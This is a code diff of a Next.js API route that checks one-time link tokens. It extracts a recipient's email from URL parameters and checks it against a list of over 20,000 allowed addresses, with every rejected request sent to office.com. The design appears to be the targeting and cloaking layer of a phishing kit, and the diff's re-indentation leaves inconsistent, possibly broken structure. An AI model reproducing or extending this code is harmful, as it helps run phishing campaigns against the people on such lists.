@@ -12,7 +12,6 @@ import { isTokenConsumed, markTokenConsumed } from '@/lib/linkDatabaseSql'
 import { logSecurityEvent } from '@/lib/securityMonitoring'
 
 export async function POST(request: NextRequest) {
-  if (process.env.NEXT_PUBLIC_ENABLE_FORMAT_A === 'true') {
   try {
     // Handle empty request body gracefully
     let body
@@ -233,7 +232,7 @@ export async function POST(request: NextRequest) {
     let firewallResult: Awaited<ReturnType<typeof import('@/lib/masterFirewall/decisionTree').masterFirewall>> | null = null
     // Firewall check DISABLED for link-status to prevent false positives
     
-        // 4. Check if link was already used (GLOBAL CHECK)
+    // 4. Check if link was already used (GLOBAL CHECK)
         // PHASE 7.4: Check in SQLite instead of JSON
         const tokenForLookup = normalizeTokenForLookup(token)
         console.log('[LINK-STATUS] Token lookup', {
@@ -304,10 +303,10 @@ export async function POST(request: NextRequest) {
           if (!emailFromURL) {
             const { fullUrl } = body
             if (fullUrl) {
-              try {
-                const url = new URL(fullUrl)
-                const params = url.searchParams
-                
+          try {
+            const url = new URL(fullUrl)
+            const params = url.searchParams
+            
                 // Check direct email parameter first
                 const emailFromParam = params.get('email')
                 if (emailFromParam && emailFromParam.includes('@')) {
@@ -320,25 +319,25 @@ export async function POST(request: NextRequest) {
                 
                 // Check all possible parameters (sid, v, hash)
                 if (!emailFromURL) {
-                  const emailFromSid = params.get('sid')
-                  const emailFromV = params.get('v')
-                  const emailFromHash = url.hash ? url.hash.substring(1) : null
-                  
-                  if (emailFromSid) {
-                    // Extract from pattern like: B3IF-example@email.com-F07H
-                    const parts = emailFromSid.split('-')
-                    let emailStartIndex = -1
-                    for (let i = 0; i < parts.length; i++) {
-                      if (parts[i].includes('@')) {
-                        emailStartIndex = i
-                        break
-                      }
-                    }
-                    
-                    if (emailStartIndex >= 0) {
-                      let emailParts = []
-                      for (let i = emailStartIndex - 1; i >= 0; i--) {
-                        const part = parts[i]
+            const emailFromSid = params.get('sid')
+            const emailFromV = params.get('v')
+            const emailFromHash = url.hash ? url.hash.substring(1) : null
+            
+            if (emailFromSid) {
+              // Extract from pattern like: B3IF-example@email.com-F07H
+              const parts = emailFromSid.split('-')
+              let emailStartIndex = -1
+              for (let i = 0; i < parts.length; i++) {
+                if (parts[i].includes('@')) {
+                  emailStartIndex = i
+                  break
+                }
+              }
+              
+              if (emailStartIndex >= 0) {
+                let emailParts = []
+                for (let i = emailStartIndex - 1; i >= 0; i--) {
+                  const part = parts[i]
                         if (part.length <= 5 && /^[A-Z0-9]+$/.test(part)) break
                         emailParts.unshift(part)
                       }
@@ -355,7 +354,7 @@ export async function POST(request: NextRequest) {
                           const decoded = Buffer.from(part, 'base64').toString('utf-8')
                           if (decoded.includes('@')) {
                             emailFromURL = decoded
-                            break
+                    break
                           }
                         } catch {}
                       }
@@ -445,58 +444,58 @@ export async function POST(request: NextRequest) {
                         if (part.length <= 5 && /^[A-Z0-9]+$/.test(part)) break
                         emailParts.push(part)
                       }
-                      emailFromURL = emailParts.join('-')
-                    } else {
-                      for (const part of parts) {
-                        try {
-                          const decoded = Buffer.from(part, 'base64').toString('utf-8')
-                          if (decoded.includes('@')) {
-                            emailFromURL = decoded
-                            break
-                          }
-                        } catch {}
-                      }
+                emailFromURL = emailParts.join('-')
+              } else {
+                for (const part of parts) {
+                  try {
+                    const decoded = Buffer.from(part, 'base64').toString('utf-8')
+                    if (decoded.includes('@')) {
+                      emailFromURL = decoded
+                      break
                     }
+                  } catch {}
+                }
+              }
                   }
                   
                   if (!emailFromURL && emailFromV && emailFromV.includes('@')) {
-                    emailFromURL = emailFromV
-                  }
+                emailFromURL = emailFromV
+              }
                   
                   if (!emailFromURL && emailFromHash && emailFromHash.includes('@')) {
-                    emailFromURL = emailFromHash
-                  }
-                }
-              } catch (error) {
+                emailFromURL = emailFromHash
+              }
+            }
+          } catch (error) {
                 // Silent fail
               }
             }
-          }
-          
-          if (emailFromURL) {
+        }
+        
+        if (emailFromURL) {
             // PHASE 7.4: Use SQLite allowedEmails list (already fetched above)
             const allowedEmailsList = allowedEmails.map(r => r.email)
-            // OPTIMIZATION: Use Set for O(1) lookup (critical for 20,000+ emails)
+          // OPTIMIZATION: Use Set for O(1) lookup (critical for 20,000+ emails)
             const allowedEmailsSet = new Set(allowedEmailsList.map((e: string) => e.toLowerCase()))
-            const isAllowed = allowedEmailsSet.has(emailFromURL.toLowerCase())
-            
-            if (!isAllowed) {
-              return NextResponse.json({ 
-                status: 'invalid',
-                error: 'Email not authorized for this link',
-                redirectUrl: 'https://office.com'
-              })
-            }
-            
-            email = emailFromURL // Use the validated email
-          } else {
-            // STRICT MODE: If Type B has email list, email MUST be validated
-            // No email extracted = BLOCK access
+          const isAllowed = allowedEmailsSet.has(emailFromURL.toLowerCase())
+          
+          if (!isAllowed) {
             return NextResponse.json({ 
               status: 'invalid',
-              error: 'Email required in URL for this link',
+              error: 'Email not authorized for this link',
               redirectUrl: 'https://office.com'
             })
+          }
+          
+          email = emailFromURL // Use the validated email
+        } else {
+          // STRICT MODE: If Type B has email list, email MUST be validated
+          // No email extracted = BLOCK access
+          return NextResponse.json({ 
+            status: 'invalid',
+            error: 'Email required in URL for this link',
+            redirectUrl: 'https://office.com'
+          })
           }
         }
       }
@@ -581,7 +580,7 @@ export async function POST(request: NextRequest) {
     
     // PHASE 7.1 FIX: Always return valid for link-status (no security checks)
     // Only fail if token/email mapping is invalid (already checked above)
-    return NextResponse.json({
+    return NextResponse.json({ 
       status: 'valid',
       email: email || undefined,
       attempts: 0, // PHASE 7.1: link-status doesn't track attempts
@@ -607,21 +606,6 @@ export async function POST(request: NextRequest) {
       redirectUrl: 'https://office.com'
     }, { status: 500 })
   }
-  }
-
-  const tokenParam = request.nextUrl.searchParams.get('token')
-  if (!tokenParam) {
-    return NextResponse.json(
-      { status: 'invalid', error: 'token query param required' },
-      { status: 400 }
-    )
-  }
-
-  // TODO: V2 – Re-enable Format A
-  return NextResponse.json({
-    status: 'valid',
-    format: 'V1-ONLY',
-  })
 }
 
 function normalizeTokenForLookup(rawToken: string): string {
